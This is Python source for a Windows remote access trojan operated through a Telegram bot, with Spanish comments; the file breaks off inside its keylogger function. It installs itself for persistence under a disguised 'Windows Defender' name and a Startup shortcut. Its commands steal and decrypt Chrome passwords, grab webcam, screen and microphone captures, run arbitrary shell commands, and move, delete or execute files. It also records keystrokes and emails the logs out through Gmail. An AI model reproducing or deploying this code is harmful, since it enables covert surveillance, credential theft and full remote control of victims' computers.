#  v3.0

import os, os.path, platform, ctypes
os.environ["PBR_VERSION"]='5.0.0'
import logging
from consoleTools import consoleDisplay as cd
from PIL import ImageGrab                                                 # /capture_pc
from shutil import copyfile, copyfileobj, rmtree, move                    # /ls, /pwd, /cd, /copy, /mv
from sys import argv, path, stdout                                        # console output
from json import loads                                                    # reading json from ipinfo.io
from winshell import startup                                              # persistence
from tendo import singleton                                               # this makes the application exit if there's another instance already running
from win32com.client import Dispatch                                      # WScript.Shell
from time import strftime, sleep
from subprocess import Popen, PIPE                                        # /cmd_exec
from getpass import getuser                                               # Obtiene el nombre del usuario
import psutil                                                             # updating
from pynput.keyboard import Key, Listener
import shutil
import win32clipboard                                                     # register clipboard
import sqlite3                                                            # get chrome passwords
import win32crypt                                                         # get chrome passwords
import base64                                                             # /encrypt_all
import datetime                                                           # /schedule
import time
import threading                                                          # /proxy, /schedule
import proxy
import pyaudio, wave                                                      # /hear
import telepot, requests                                                  # telepot       => telegram, requests       => file download
from telepot.namedtuple import InlineKeyboardMarkup, InlineKeyboardButton
import pythoncom, pyHook                                                # keylogger
import socket                                                             # internal IP
import getpass                                                            # get username
import collections
import urllib                                                             # wallpaper
import cv2                                                                # webcam
import yagmail
from datetime import datetime 
from ctypes import *                                                      # fixing pyinstaller - we need to import all the ctypes to get api-ms-win-crt-*, you will also need https://www.microsoft.com/en-US/download/details.aspx?id=48145

try: # Crea dirección
    os.makedirs('C:\\Users\\Public\\Security\\Windows Defender')
except:
    pass
nameKey = "WindowsDefenderAdvanced.exe"
filePath = "C:\\Users\\Public\\Security\\Windows Defender\\"+ nameKey
try:
    with open(filePath, 'r') as f:      # Verifica si el keylogger se encuentra oculto en el sistema
        print("El keylogger ya se encuentra en la carpeta oculta")
except :
    print("El Keylogger no se encuentra en el sistema, y tratará de copiarlo")
    try:
        shutil.copy(nameKey , filePath) # Intenta ocultar el keylogger en una carpeta
        print("El keylogger se escondió exitosamente en el sistema")
    except:
        print("No se puedo esconder el Keylogger en el sistema")
try:  # Intenta crear la dirección
    os.makedirs('logs')
except:
    pass
    
cd.log('i','Starting')
me = singleton.SingleInstance()

token = 'xx:xx'                                                 # <== Aquí debes ingresar el codigo único de tu Bot
if 'RVT_TOKEN' in os.environ:                                   # it can also be set as an environment variable
    token = os.environ['RVT_TOKEN']
    
app_name = 'Microsoft'                                          # Nombre de la carpeta en dentro delRoaming
known_ids = ['']                                                # Ejemplo => 991466973 <= Ejemplo                 # AGREGUE SU chat_id EN FORMATO DE CADENA A LA LISTA A CONTINUACIÓN SI DESEA QUE SU BOTELO SOLO RESPONDA A UNA PERSONA
appdata_roaming_folder = os.environ['APPDATA']
hide_folder = appdata_roaming_folder + '\\' + app_name      #Carpeta escondite
compiled_name = app_name + '.exe'           # ruta donde se compilará
target_shortcut = startup() + '\\' + compiled_name.replace('.exe', '.lnk')
if not os.path.exists(hide_folder):
	os.makedirs(hide_folder)
	hide_compiled = hide_folder + '\\' + compiled_name
	copyfile(argv[0], hide_compiled)
	shell = Dispatch('WScript.Shell')
	shortcut = shell.CreateShortCut(target_shortcut)
	shortcut.Targetpath = hide_compiled
	shortcut.WorkingDirectory = hide_folder
	shortcut.save()
if not os.path.exists('logs/{}-log.txt'.format(str(datetime.now().strftime('%Y-%m-%d')))):
        f=open('logs/{}-log.txt'.format(str(datetime.now().strftime('%Y-%m-%d'))))
        f.close()
destroy = False
user = os.environ.get("USERNAME")	# Windows username to append keylogs
schedule = {}
log_file = hide_folder + '\\.user'
keylogs_file = hide_folder + '\\.keylogs'
with open(log_file, "a") as writing:
	writing.write("-------------------------------------------------\n")
	writing.write(user + " Log: " + strftime("%b %d@%H:%M") + "\n\n")
logging.basicConfig(filename=log_file,level=logging.DEBUG)

def runStackedSchedule(everyNSeconds):  #Ejecuta en un horario predeterminado
    for k in schedule.keys():
        if k < datetime.datetime.now():
            handle(schedule[k])
            del schedule[k]
    threading.Timer(everyNSeconds, runStackedSchedule).start()
def internalIP():
    internal_ip = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    internal_ip.connect(('google.com', 0))
    return internal_ip.getsockname()[0]
def checkchat_id(chat_id):
    return len(known_ids) == 0 or str(chat_id) in known_ids
def split_string(n, st):
    lst = ['']
    for i in str(st):
        l = len(lst) - 1
        if len(lst[l]) < n:
            lst[l] += i
        else:
            lst += [i]
    return lst

def send_safe_message(bot, chat_id, message):
    while(True):
        try:
            cd.log('n', 'Message sent:\n{}'.format(
                bot.sendMessage(chat_id, message)), True)
            break
        except:
            pass
def handle(msg):
    chat_id = msg['chat']['id']
    if checkchat_id(chat_id):
        response = ''
        if 'text' in msg:
            cd.log('n', '\n\t\tAdministrador con ID: ' + str(chat_id) + '\n\n Uso el comando:\t\t' + msg['text'] + '\n\n', True)
            command = msg['text']
            try:
                if command == '/redInfo':                       # Información de la RED
                    response = ''
                    bot.sendChatAction(chat_id, 'typing')
                    lines = os.popen('arp -a -N ' + internalIP())
                    for line in lines:
                        line.replace('\n\n', '\n')
                        response += line  
                elif command == '/webcam':                      # Captura de Web Cam 
                    bot.sendChatAction(chat_id, 'typing')
                    camera = cv2.VideoCapture(0)
                    while True:
                        return_value, image = camera.read()
                        gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
                        cv2.imshow('image', gray)
                        if cv2.waitKey(1) & 0xFF == ord('s'):
                            cv2.imwrite('webcam.jpg', image)
                            break
                    camera.release()
                    cv2.destroyAllWindows()
                    bot.sendChatAction(chat_id, 'upload_photo')
                    bot.sendDocument(chat_id, open('webcam.jpg', 'rb'))
                    os.remove('webcam.jpg')
                elif command == '/captura':                     # Captura de pantalla
                    bot.sendChatAction(chat_id, 'typing')   
                    screenshot = ImageGrab.grab()
                    screenshot.save('screenshot.jpg')
                    bot.sendChatAction(chat_id, 'upload_photo')
                    bot.sendDocument(chat_id, open('screenshot.jpg', 'rb'))
                    os.remove('screenshot.jpg')
                elif command.startswith('/cmd'):                # CMD    
                    try:
                        cd.log('w', 'Command exec prep')
                        process = Popen(['cmd'], stdin=PIPE, stdout=PIPE)
                        command = command.replace('/cmd', '')
                        cd.log('w', 'Executing the command '+command)
                        if len(command) > 1:
                            process.stdin.write(bytes(command + '\n'))
                            process.stdin.close()
                            lines = process.stdout.readlines()
                            for l in lines:
                                response += l
                        else:
                            response = '/cmd dir'
                    except:
                        response = 'Vuelve a escribir '
                elif command.startswith('/ir'):                 # Navegar entre carpetas
                    command = command.replace('/ir ', '')
                    try:
                        os.chdir(command)
                        response = os.getcwd() + '>'
                    except:
                        response = 'No subfolder matching ' + command
                elif command == '/cmd_dns':                     # Informacion DNS
                    bot.sendChatAction(chat_id, 'typing')
                    lines = os.popen('ipconfig /displaydns')
                    for line in lines:
                        line.replace('\n\n', '\n')
                        response += line
                elif command == '/cmd_ipconfig':                # Informacion IPConfig
                    bot.sendChatAction(chat_id, 'typing')
                    lines = os.popen('ipconfig /all')
                    for line in lines:
                        line.replace('\n\n', '\n')
                        response += line
                elif command.startswith('/descargar'):          # Descargar un archivo
                    bot.sendChatAction(chat_id, 'typing')
                    path_file = command.replace('/descargar', '')
                    path_file = path_file[1:]
                    if path_file == '':
                        response = '/descargar C:/path/to/file.name or /descargarfile.name'
                    else:
                        bot.sendChatAction(chat_id, 'upload_document')
                        try:
                            bot.sendDocument(chat_id, open(path_file, 'rb'))
                        except:
                            try:
                                bot.sendDocument(chat_id, open(
                                    hide_folder + '\\' + path_file))
                                response = 'Found in hide_folder: ' + hide_folder
                            except:
                                response = 'Could not find ' + path_file
                elif command.startswith('/copiar'):             # Copia archivos
                    command = command.replace('/copiar', '')
                    command = command.strip()
                    if len(command) > 0:
                        try:
                            file1 = command.split('"')[1]
                            file2 = command.split('"')[3]
                            copyfile(file1, file2)
                            response = 'Archivos copiados exitosamente.'
                        except Exception as e:
                            response = 'Error: \n' + str(e)
                    else:
                        response = 'Usage: \n/copiar "C:/Users/DonaldTrump/Desktop/porn.jpg" "C:/Users/DonaldTrump/AppData/Roaming/Microsoft Windows/[pornography.jpg]"'
                        response += '\n\nDouble-Quotes are needed in both whitespace-containing and not containing path(s)'
                elif command.endswith('block_key'):             # Bloquear teclado
                    response = 'Ésta funcionalidad, está en proceso'
                elif command.endswith('block_mouse'):           # Bloquear Mouse
                    response = 'Ésta funcionalidad, está en proceso'
                elif command.endswith('desblock_mouse'):        # Desbloquear Mouse
                    response = 'Ésta funcionalidad, está en proceso'
                elif command.endswith('desblock_mouse'):
                    response = 'Ésta funcionalidad, está en proceso'      
                elif command == '/get_chrome':                  # Obtiene contraseñas de Chrome
                    con = sqlite3.connect(os.path.expanduser(
                        '~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data')
                    cursor = con.cursor()
                    cursor.execute(
                        "SELECT origin_url,username_value,password_value from logins;")
                    for users in cursor.fetchall():
                        response += 'Website: ' + users[0] + '\n'
                        response += 'Username: ' + users[1] + '\n'
                        response += 'Password: ' + \
                            str(win32crypt.CryptUnprotectData(
                                users[2], None, None, None, 0)) + '\n\n'
                elif command == '/get_wifi':  
                    pass
                elif command == '/get_key':
                    try:
                        bot.sendChatAction(chat_id, 'upload_document')
                        bot.sendDocument(chat_id, open(keylogs_file, "rb"))
                    except:
                        response = 'No se pudo obtener el registro de Teclas.'
                    pass
                elif command == '/get_desktop':
                    try:
                        r= "C:\\Users\\"+str(getuser())+"\\Desktop\\"
                        os.chdir(r)
                        response = os.getcwd() + '>'
                    except:
                        response = "Hubo un error al acceder a la ruta" 
                    
                elif command == '/get_documents':
                    """
                    r= "C:\\Users\\"+str(getuser())+"\\Documents\\"
                    os.chdir(r)
                    response = os.getcwd() + '>'
                    
                    try:
                        r= "O:\\OneDrive - xKx\\SoftwareProyectGit\\RAT-via-Telegram\\tests\\"
                        # F:\esto\file1.txt
                        #bot.sendChatAction(chat_id, 'typing')
                        files = []
                        files = os.listdir(r)
                        human_readable = ''
                        for file in files:
                            human_readable += file + '\n'
                            #bot.sendDocument(chat_id, open(file, "rb"))
                            #bot.sendDocument(chat_id, open( hide_folder + '\\' + path_file))
                            try:
                                bot.sendChatAction(chat_id, 'upload_document')
                                bot.sendDocument(chat_id, open("\\"+file))
                                response += "se envió"+file
                            except:
                                response += "no se envió el archivo: "+file
                            
                        response += human_readable
                    except:
                        response = ' Hubo un error, vuelva a intentarlo denuevo'
                    """
                    pass 
                elif command == '/get_download':
                    r= "C:\\Users\\"+str(getuser())+"\\Downloads\\"
                    os.chdir(r)
                    response = os.getcwd() + '>'
                elif command == '/get_videos':
                    r= "C:\\Users\\"+str(getuser())+"\\Videos\\"
                    os.chdir(r)
                    response = os.getcwd() + '>'
                    
                elif command == '/get_music':
                    r= "C:\\Users\\"+str(getuser())+"\\Music\\"
                    os.chdir(r)
                    response = os.getcwd() + '>'
                    
                elif command == '/get_pictures':
                    r= "C:\\Users\\"+str(getuser())+"\\Pictures\\"
                    os.chdir(r)
                    response = os.getcwd() + '>'
                elif command == '/eliminar_key':
                    command = command.replace('/eliminar_key', '')
                    path_file = command.strip()
                    try:
                        os.remove("C:\\Users\\"+str(getuser())+"\\AppData\\Roaming\\Microsoft\\.keylogs")
                        response = 'El archivo ".keylogs" se eliminó correctamente' 
                    except:
                        response = 'No se pudo eliminar el archivo ".keylogs" '
                elif command.startswith('/eliminar'):           # Elimina carpeta o archivo
                    command = command.replace('/eliminar', '')
                    path_file = command.strip()
                    try:
                        os.remove(path_file)
                        response = 'El archivo se eliminó correctamente'
                    except:
                        try:
                            os.rmdir(path_file)
                            response = 'La carpeta se eliminó correctamente'
                        except:
                            try:
                                shutil.rmtree(path_file)
                                response = 'Succesfully removed folder and it\'s files'
                            except:
                                response = 'El archivo no existe'
                elif command.startswith('/audio'):              # Graba Audio
                    try:
                        SECONDS = -1
                        try:
                            SECONDS = int(command.replace('/hear', '').strip())
                        except:
                            SECONDS = 5

                        CHANNELS = 2
                        CHUNK = 1024
                        FORMAT = pyaudio.paInt16
                        RATE = 44100

                        audio = pyaudio.PyAudio()
                        bot.sendChatAction(chat_id, 'typing')
                        stream = audio.open(format=FORMAT, channels=CHANNELS,
                                            rate=RATE, input=True,
                                            frames_per_buffer=CHUNK)
                        frames = []
                        for i in range(0, int(RATE / CHUNK * SECONDS)):
                            data = stream.read(CHUNK)
                            frames.append(data)
                        stream.stop_stream()
                        stream.close()
                        audio.terminate()

                        wav_path = hide_folder + '\\mouthlogs.wav'
                        waveFile = wave.open(wav_path, 'wb')
                        waveFile.setnchannels(CHANNELS)
                        waveFile.setsampwidth(audio.get_sample_size(FORMAT))
                        waveFile.setframerate(RATE)
                        waveFile.writeframes(b''.join(frames))
                        waveFile.close()
                        bot.sendChatAction(chat_id, 'upload_document')
                    except OSError:
                        cd.log(
                            'e', 'Unable to listen in - there is probably no input device.')
                        response = 'unable to listen in - there is probably no input device'
                elif command == '/ip_info':                     # Información del IP
                    try:
                        bot.sendChatAction(chat_id, 'find_location')
                        info = requests.get('http://ipinfo.io').text  # json format
                        location = (loads(info)['loc']).split(',')
                        bot.sendLocation(chat_id, location[0], location[1])
                        import string
                        import re
                        response = 'External IP: '
                        response += "".join(
                            filter(lambda char: char in string.printable, info))
                        response = re.sub('[:,{}\t\"]', '', response)
                        response += '\n' + 'Internal IP: ' + '\n\t' + internalIP()
                    except:
                        response = 'Hubo un error'
                elif command.startswith('/listar'):                 # Muestra lista de archivos y carpetas
                    try:
                        bot.sendChatAction(chat_id, 'typing')
                        command = command.replace('/listar', '')
                        command = command.strip()
                        files = []
                        if len(command) > 0:
                            files = os.listdir(command)
                        else:
                            files = os.listdir(os.getcwd())
                        human_readable = ''
                        for file in files:
                            human_readable += file + '\n'
                        response = human_readable
                    except:
                        response = ' Hubo un error, vuelva a intentarlo denuevo'
                elif command.startswith('/mensaje'):            # Muestra un mensaje    
                    message = command.replace('/mensaje', '')
                    if message == '':
                        response = '/mensaje <Escriba su mensaje>'
                    else:
                        ctypes.windll.user32.MessageBoxW(
                            0, message, u'Information', 0x40)
                        response = 'MsgBox displayed'
                elif command.startswith('/mover'):              # Mueve archivos 
                    command = command.replace('/mover', '')
                    if len(command) > 0:
                        try:
                            file1 = command.split('"')[1]
                            file2 = command.split('"')[3]
                            move(file1, file2)
                            response = 'El archivo se movió exitosamente.'
                        except Exception as e:
                            response = 'Error: \n' + str(e)
                    else:
                        response = 'Usage: \n/mv "C:/Users/DonaldTrump/Desktop/porn.jpg" "C:/Users/DonaldTrump/AppData/Roaming/Microsoft Windows/[pornography.jpg]"'
                        response += '\n\nDouble-Quotes are needed in both whitespace-containing and not containing path(s)'
                elif command == '/pc_info':                     # Información de la Computadora
                    bot.sendChatAction(chat_id, 'typing')
                    info = ''
                    for pc_info in platform.uname():
                        info += '\n' + pc_info
                    info += '\n' + 'Username: ' + getpass.getuser()
                    response = info
                elif command == '/test':                        # Verifica conexión
                    response = platform.uname()[1] + ': I\'Se encuentra en linea!!'
                elif command.startswith('/web'):                # Abre el navegador con una URL 
                    command = command.replace('/web', '')
                    command = command.strip()
                    if len(command) > 0:
                        systemCommand = 'start \"\" \"'
                        systemCommand += command
                        systemCommand += '\"'
                        if os.system(systemCommand) == 0:
                            response = 'La pagina web se abrió con exito'
                        else:
                            response = 'Hubo un error al abrir la pagina web'
                    else:
                        response = '/web URL'
                elif command == '/proxy':                       # Abre puertos
                    threading.Thread(target=proxy.main).start()
                    info = requests.get('http://ipinfo.io').text  # json format
                    ip = (loads(info)['ip'])
                    response = 'Proxy succesfully setup on ' + ip + ':8081'
                elif command == '/this':                        # Carpeta donde se encuentra RAT
                    response = os.getcwd()
                elif command.startswith('/python_exec'):
                    command = command.replace('/python_exec', '').strip()
                    if len(command) == 0:
                        response = 'Usage: /python_exec print(\'printing\')'
                    else:
                        cd.log('w', 'Executing python command')
                        if response == '':
                            response = 'Expression executed. No return or malformed expression.'
                elif command == '/reiniciar':                   # Reiniciará
                    bot.sendChatAction(chat_id, 'typing')
                    command = os.popen('shutdown /r /f /t 0')
                    response = 'Computer will be restarted NOW.'
                elif command.startswith('/ejecutar'):           # Ejecuta un archivo
                    bot.sendChatAction(chat_id, 'typing')
                    path_file = command.replace('/ejecutar', '')
                    path_file = path_file[1:]
                    if path_file == '':
                        response = '/run_file C:/path/to/file'
                    else:
                        try:
                            os.startfile(path_file)
                            response = 'El archivo\n\n' + path_file + '\n\n Se ejecutó correctamente.'
                        except:
                            try:
                                os.startfile(hide_folder + '\\' + path_file)
                                response = 'El archivo:\n ' + path_file + '\n\n Se ejecutó en hide_folder'
                            except:
                                response = 'No se encuentra el archivo'
                elif command.startswith('/calendario'):         # Cambia la fecha del calendarios
                    command = command.replace('/calendario', '')
                    if command == '':
                        response = '/calendario 2017 12 24 23 59 /msg_box happy christmas'
                    else:
                        scheduleDateTimeStr = command[1:command.index('/') - 1]
                        scheduleDateTime = datetime.datetime.strptime(
                            scheduleDateTimeStr, '%Y %m %d %H %M')
                        scheduleMessage = command[command.index('/'):]
                        schedule[scheduleDateTime] = {
                            'text': scheduleMessage, 'chat': {'id': chat_id}}
                        response = 'Schedule set: ' + scheduleMessage
                        runStackedSchedule(10)
                elif command == '/auto_destruye':               # Auto destruye Rat
                    bot.sendChatAction(chat_id, 'typing')
                    global destroy
                    destroy = True
                    response = 'You sure? Type \'/destroy\' to proceed.'
                elif command == '/apagar':                      # Apaga la computadora
                    bot.sendChatAction(chat_id, 'typing')
                    command = os.popen('apagar /s /f /t 0')
                    response = 'La computadora se apagará AHORA.'
                elif command == '/destruir' and destroy == True: # Destruye el RAT
                    bot.sendChatAction(chat_id, 'typing')
                    if os.path.exists(hide_folder):
                        rmtree(hide_folder)
                    if os.path.isfile(target_shortcut):
                        os.remove(target_shortcut)
                    os._exit(0)
                elif command == '/tareas':                # Ver lista de tareas
                    lines = os.popen('tasklist /FI \"STATUS ne NOT RESPONDING\"')
                    response2 = ''
                    for line in lines:
                        line.replace('\n\n', '\n')
                        if len(line) > 2000:
                            response2 += line
                        else:
                            response += line
                    response += '\n' + response2
                elif command.startswith('/enviar'):             # Envia archivo de PC Maestro a PC victima
                    command = command.replace('/enviar', '') 
                    import winsound
                    winsound.Beep(440, 300)
                    if command == '':
                        response = '/enviar <COMPUTER_1_NAME>, <COMPUTER_2_NAME> /msg_box Hello HOME-PC and WORK-PC'
                    else:
                        targets = command[:command.index('/')]
                        if platform.uname()[1] in targets:
                            command = command.replace(targets, '')
                            msg = {'text': command, 'chat': {'id': chat_id}}
                            handle(msg)      
                elif command == '/actualizar':                      # Actualiza F5 RAT
                    proc_name = app_name + '.exe'
                    if not os.path.exists(hide_folder + '\\updated.exe'):
                        response = 'Send updated.exe first.'
                    else:
                        for proc in psutil.process_iter():
                            # check whether the process name matches
                            if proc.name() == proc_name:
                                proc.kill()
                        os.rename(hide_folder + '\\' + proc_name,
                                  hide_folder + '\\' + proc_name + '.bak')
                        os.rename(hide_folder + '\\updated.exe',
                                  hide_folder + '\\' + proc_name)
                        os.system(hide_folder + '\\' + proc_name)
                        sys.exit()
                elif command.startswith('/fondo'):              # Cambiar de fondo de pantalla
                    command = command.replace('/fondo', '')
                    command = command.strip()
                    if len(command) == 0:
                        response = 'Usage: /fondo C:/Users/User/Desktop/porn.jpg'
                    elif command.startswith('http'):
                        image = command.rsplit('/', 1)[1]
                        image = hide_folder + '/' + image
                        urllib.urlretrieve(command, image)
                        ctypes.windll.user32.SystemParametersInfoW(
                            20, 0, image, 3)
                    else:
                        ctypes.windll.user32.SystemParametersInfoW(
                            20, 0, command.replace('/', '//'), 3)
                        response = 'Se cambió el fondo de pantalla.'         
                elif command == '/help':
                    # functionalities dictionary: command:arguments
                    functionalities = {'/red_info': '       => Información de la Red',\
                                       '/webcam': '       => Toma foto a la WebCam',\
                                       '/captura': '       => ',\
                                       #'/cmd': '       => Ejecuta desde Consola ',\
                                       '/ir': '       => Navega entre carpetas',\
                                       '/eliminar': '       => Elimina archivo o carpeta',\
                                       '/eliminar_key':'       => Elimina el archivo Keylogger',\
                                       '/cmd_dns': '       => Muestra información DNS',\
                                       #'/cmd_ipconfig':'       => Muestra información IP Config',\
                                       '/descargar': '       => Descarga un archivo',\
                                       '/copiar': '       => Copiar archivos, de la misma PC',\
                                       '/mover': '       => Mueve archivos',\
                                       #'/block_key': '       => Bloquea el Teclado',\
                                       #'/block_mouse': '       => Bloquea el movimiento del Mouse',\
                                       #'/desblock_mouse': '       => Desbloquear movimiento del mouse',\
                                       '/get_chrome': '       => Obtener contraseñas de chrome',\
                                       #'/get_wifi': '       => Obtener contraseñas de Wifi',\
                                       '/get_key':'       => Obtiene el registro de teclas',\
                                       #'/get_documents':'       => Obtiene Documentos del Usuario',\
                                       #'/get_music':'       => Obtiene Musica del Usuario',\
                                       #'/get_videos':'       => Obtiene Videos del Usuario',\
                                       #'/get_pictures':'       => Obtiene Photos del Usuario',\
                                       #'/get_download':'       => Obtiene Descargas del Usuario',\
                                       #'/get_desktop':'       => Obtiene Escritorio del Usuario',\
                                       '/audio': '       => [tiempo en segundos, default=5s]',\
                                       '/ip_info': '       => Obtener información de IP',\
                                       '/test': '       => Verifica si la victima está en linea',\
                                       '/web': '       => Abre en el navegador un LINK',\
                                       '/proxy': '       => Abre un proxy',\
                                       '/this': '       =>  Muestra directorio actual RAT',\
                                       '/listar': '       =>  Muestra directorio actual RAT',\
                                       '/reiniciar': '       => Reinicia la computadora',\
                                       '/ejecutar': '       => Ejecuta un archivo *EXE',\
                                       #'/calendario': '       => Modifica el calendario',\
                                       #'/auto_destruye': '       => Se destruye RAT',\
                                       '/apagar': '       => Apaga la computadora',\
                                       #'/destruir': '       => Destruye el RAT',\
                                       '/tareas': '       => Lista de Tareas',\
                                       '/enviar': '       => Envia Archivos a la PC de la victima',\
                                       #'/actualizar': '       => Actualiza la carpeta',\
                                       '/fondo': '       => Cambia de fondo de pantalla'}
                    response = "\n".join(command + ' ' + description for command, description in sorted(functionalities.items()))
                else:  # redirect to /help
                    cd.log('w', 'BOT MISUSE: Invalid command')
                    msg = {'text': '/help', 'chat': {'id': chat_id}}
                    handle(msg)
            except Exception as e:
                cd.log('e', 'BOT MISUSE: Unknown error running command or function.')
                cd.log('z', 'Details from previous error'+str(e))
            cd.log('n', 'Command {} ran'.format(command))
        else:  # Upload a file to target
            file_name = ''
            file_id = None
            if 'document' in msg:
                file_name = msg['document']['file_name']
                file_id = msg['document']['file_id']
            elif 'photo' in msg:
                file_time = int(time.time())
                file_id = msg['photo'][1]['file_id']
                file_name = file_id + '.jpg'
            file_path = bot.getFile(file_id=file_id)['file_path']
            link = 'https://api.telegram.org/file/bot' + \
                str(token) + '/' + file_path
            file = (requests.get(link, stream=True)).raw
            with open(hide_folder + '\\' + file_name, 'wb') as out_file:
                copyfileobj(file, out_file)
            response = 'Archivo guardado como: ' + file_name
        if response != '':
            responses = split_string(4096, response)
            for resp in responses:
                send_safe_message(bot, chat_id, resp)

def VerificarConexion():
    con = socket.socket(socket.AF_INET,socket.SOCK_STREAM)         # Creamos el socket de conexion
    try:                                                            # Intenta conectarse al servidor de Google
        con.connect(('www.google.com', 80))
        con.close()
        return True
    except:
        return False
def sendEmail(log, sender_email, sender_password, receiver_email):   # Envía los datos .keylogs vía Gmail 
    try:
        mifecha                 = datetime.datetime.now()
        subject                 = "Data User: "+ str(getuser()) 
        # Inicia Sesión 
        yag = yagmail.SMTP(user=sender_email, password=sender_password)
        informacion = "\nFecha: "+  mifecha.strftime("%A") + " " + mifecha.strftime("%d") + " de " + mifecha.strftime("%B") + "\nHora: " + mifecha.strftime("%I")+ ":"+ mifecha.strftime("%M")+ " "+ mifecha.strftime("%p")+ " con " + mifecha.strftime("%S") +" Segundos"
        # Cuerpo del mensaje
        contents = [ 
            "Información:\n\nNombre de Usuario: "+ str(getuser()) + informacion
        ]
        yag.send(receiver_email, subject, contents, attachments=log )
        print("[+] Se envió el correo correctamente")
        return True;
    except:
        print("[-] No se pudo envíar el correo")
        return False
def SendLog():        
    while (True):
        # Gmail Emisor
        sender_email_P            = "correo1@gmail.com"             # <== Correo de envío principal
        sender_password_P         = "contraseña1"                   # <== Contraseña de envío principal
        sender_email_S            = "correo2@gmail.com"             # <== Correo de envío principal     <== (Solo en caso de que el correo principal falle)
        sender_password_S         = "contraseña2"                   # <== Contraseña de envío principal <== (Solo en caso de que el correo principal falle)
        # Email Receptor
        receiver_email          = ["micorreo1@gmail.com"]                                   # <== 1 Remitente (Es el correo que recibirá el keylogg)
       #receiver_email          = ["micorreo1@gmail.com", "micorreo2.5648@hotmail.com"]     # <== 2 Remitentes (Estos son los correos a los cuales le llegará el keylogger)
       
        for x in range(730): 
            time.sleep(10)
        if VerificarConexion(): 
            homedir = "C:\\Users\\"+str(getuser())+"\\AppData\\Roaming\\Microsoft\\.keylogs"
            if sendEmail(homedir, sender_email_P, sender_password_P , receiver_email):
                os.remove(homedir)
            elif sendEmail(homedir, sender_email_S, sender_password_S , receiver_email):
                os.remove(homedir)
        else:
            pass
def KeyConMin(argument):                # Caracteres Comunes // Optimizados
    switcher = {
        # Vocales Miniscula
        "'a'": "a",
        "'e'": "e",
        "'i'": "i",
        "'o'": "o",
        "'u'": "u",
        # Letras  Minusculas
        "'b'": "b",
        "'c'": "c",
        "'d'": "d",
        "'f'": "f",
        "'g'": "g",
        "'h'": "h",
        "'j'": "j",
        "'J'": "J",
        "'k'": "k",
        "'l'": "l",
        "'m'": "m",
        "'n'": "n",
        "'ñ'": "ñ",
        "'p'": "p",
        "'q'": "q",
        "'r'": "r",
        "'s'": "s",
        "'t'": "t",
        "'v'": "v",
        "'w'": "w",
        "'x'": "x",
        "'y'": "y",
        "'z'": "z",
        # Caracteres
        "','": ",",                     # ,
        "'.'": ".",                     # .
        "'_'": "_",                     # _
        "'-'": "-",                     # -
        "':'": ":",                     #
        # Vocales Mayúsculas
        "'A'": "A",
        "'E'": "E",
        "'I'": "I",
        "'O'": "O",
        "'U'": "U",
        # Letras Mayúsculas
        "'B'": "B",
        "'C'": "C",
        "'D'": "D",
        "'F'": "F",
        "'G'": "G",
        "'H'": "H",
        "'K'": "K",
        "'L'": "L",
        "'M'": "M",
        "'N'": "N",
        "'Ñ'": "Ñ",
        "'P'": "P",
        "'Q'": "Q",
        "'R'": "R",
        "'S'": "S",
        "'T'": "T",
        "'V'": "V",
        "'W'": "W",
        "'X'": "X",
        "'Y'": "Y",
        "'Z'": "Z",
        # Números Standard
        "'1'": "1",
        "'2'": "2",
        "'3'": "3",
        "'4'": "4",
        "'5'": "5",
        "'6'": "6",
        "'7'": "7",
        "'8'": "8",
        "'9'": "9",
        "'0'": "0",
        # Caracteres Especiales
        "'@'": "@",                     # @
        "'#'": "#",                     # #
        "'*'": "*",                     #
        "'('": "(",                     # (
        "')'": ")",                     # )
        "'?'": "?",                     # ?
        "'='": "=",                     # =
        "'+'": "+",                     # +
        "'!'": "!",                     # !
        "'}'": "}",                     # }
        "'{'": "{",                     # {}
        "'´'": "´",                     # ´
        "'|'": "|",                     # |
        "'°'": "°",                     # °
        "'^'": "¬",                     # ^
        "';'": ";",                     #
        "'$'": "$",                     # $
        "'%'": "%",                     # %
        "'&'": "&",                     # &
        "'>'": ">",                     #
        "'<'": "<",                     # 
        "'/'": "/",                     # /
        "'¿'": "¿",                     # ¿
        "'¡'": "¡",                     # ¡
        "'~'": "~"                      #
    }
    return switcher.get(argument, "")
def KeyConMax(argument):                # Botones, comunes // Optimizados
    switcher = {
        "Key.space": " ",               # Espacio
        "Key.backspace": "«",           # Borrar
        "Key.enter": "\r\n",            # Salto de linea
        "Key.tab": "    ",              # Tabulación
        "Key.delete":" «×» ",           # Suprimir
        # Números
        "<96>": "0",                 # 0
        "<97>": "1",                 # 1
        "<98>": "2",                 # 2
        "<99>": "3",                 # 3
        "<100>": "4",                # 4
        "<101>": "5",                # 5
        "<102>": "6",                # 6
        "<103>": "7",                # 7
        "<104>": "8",                # 8
        "<105>": "9",                # 9
        # Números Númeral
        "None<96>": "0",                 # 0
        "None<97>": "1",                 # 1
        "None<98>": "2",                 # 2
        "None<99>": "3",                 # 3
        "None<100>": "4",                # 4
        "None<101>": "5",                # 5
        "None<102>": "6",                # 6
        "None<103>": "7",                # 7
        "None<104>": "8",                # 8
        "None<105>": "9",                # 9
        # Teclas raras 2 
        "['^']": "^",
        "['`']": "`",                     #
        "['¨']": "¨",                     #
        "['´']": "´",                     #
        "<110>": ".",                     #
        "None<110>": ".",                 #
        "Key.alt_l": " [Alt L] ",         #
        "Key.alt_r": " [Alt R] ",
        #"Key.shift_r": " [Shift R] ",
        #"Key.shift": " [Shift L] ",
        "Key.ctrl_r": " [Ctrl R] ",    #
        "Key.ctrl_l": " [Ctrl L] ",    #
        "Key.right" : " [Right] ",                 #
        "Key.left"  : " [Left] ",                  #
        "Key.up"    : " [Up]",                    #
        "Key.down"  : " [Down] ",                  #
        #"'\x16'"  : " [Pegó] ",
        #"'\x18'"  : " [Cortar] ", 
        #"'\x03'"  : " [Copiar] ", 
        "Key.caps_lock"  : " [Mayus lock] ",  
        #"Key.media_previous"    : " ♫ ",     #
        #"Key.media_next"        : " ♫→ ",         #
        #"Key.media_play_pause"  : " ■ ♫ ■ ",#
        "Key.cmd"               : " [Win] "          #
    }
    return switcher.get(argument, "")
def Klogger():                              # Obtiene registro de teclas y guarda en un archivo .keylogs
    try:        # Intenta crear el archivo
        log = os.environ.get(
        'pylogger_file',
        os.path.expanduser('C:\\Users\\'+str(getuser())+'\\AppData\\Roaming\\Microsoft\\.keylogs')
        )
        T = datetime.datetime.now()
